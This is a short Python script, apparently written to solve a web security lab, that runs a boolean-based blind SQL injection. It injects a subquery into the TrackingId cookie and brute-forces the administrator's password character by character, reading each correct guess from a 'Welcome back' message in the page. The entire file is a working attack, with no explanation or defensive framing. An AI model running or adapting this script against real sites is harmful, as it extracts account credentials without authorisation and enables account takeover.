#!/usr/bin/env python3

from pwn import *
import requests
import sys
import signal
import string
import time

def def_handler(sig,frame):
    print(f"\n\n[!] Exit...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

def makeSQLI():

    p1 = log.progress("SQLI")
    p1.status("Starting brute force attack...")

    time.sleep(2)

    password = ""
    
    p2 = log.progress("Password")

    for position in range (1,21):
        for character in characters:
                # In this example, the vulnerability is located in the TrackingId
            cookies = {
                'TrackingId': f"8oiRbVeMbirEU9kg' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -;",
                'session': "Poz8EIKs0YxZSUEkxmXEzEnu0R97VCWZ"
            }
            #print(cookies["TrackingId"])

            p1.status(cookies["TrackingId"])

            r= requests.get("https://page.net", cookies=cookies)
            
            # The difference we have in the page when the character is correct
            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                break

    print(password)


if __name__ == '__main__':
    makeSQLI()
